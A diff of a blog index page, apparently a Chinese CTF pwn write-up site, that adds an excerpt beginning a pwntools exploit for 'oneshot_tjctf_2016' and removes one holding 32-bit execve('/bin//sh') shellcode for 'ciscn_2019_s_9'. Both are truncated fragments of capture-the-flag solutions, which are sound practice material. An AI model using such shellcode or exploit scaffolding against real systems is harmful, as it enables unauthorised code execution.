@@ -157,6 +157,55 @@
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/02/05/oneshot_tjctf_2016/">
+        <p class="h4 index-header">oneshot_tjctf_2016</p>
+      </a>
+
+      <a href="/2020/02/05/oneshot_tjctf_2016/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">oneshot_tjctf_2016
+
+
+
+*v4，要用str(elf.got[&#39;__libc_start_main&#39;])
+接受要用int(sh.recvuntil(&quot;\n&quot;,True),16)
+exp
+# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+elf = ELF(&#39;./oneshot_tjctf_2016&#39;)
+lib = 0
+sh = 0
+def pwn(ip,por</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-05&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF/">CTF</a>&nbsp;
+          
+            <a href="/categories/CTF/buu/">buu</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
       <a href="/2020/02/04/leak_canary-others_babystack/">
         <p class="h4 index-header">leak_canary-others_babystack</p>
       </a>
@@ -576,64 +625,6 @@ sh.recvuntil(&quot;shot!\n&q</div>
             <a href="/categories/CTF/">CTF</a>&nbsp;
           
             <a href="/categories/CTF/Hgame/">Hgame</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/01/25/ciscn_2019_s_9/">
-        <p class="h4 index-header">ciscn_2019_s_9</p>
-      </a>
-
-      <a href="/2020/01/25/ciscn_2019_s_9/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">ciscn_2019_s_9
-
-啥保护没开，第一时间考虑shellcode
-
-
-
-
-另外leak只有50，leak多才考虑直接走rop
-
-
-尝试过ret2libc,但是怎么都调不出来= =
-shellcode =&#39;&#39;&#39;
-xor    eax,eax
-push   eax
-push   0x68732f2f #//sh
-push   0x6e69622f # /bin
-mov    ebx,esp
-mov    ecx,eax
-mov    edx,eax
-mov    al,0xb
-int    0x80
-xor    eax,eax
-inc    eax
-int   </div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-25&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF/">CTF</a>&nbsp;
-          
-            <a href="/categories/CTF/buu/">buu</a>&nbsp;
           &nbsp;
         
         
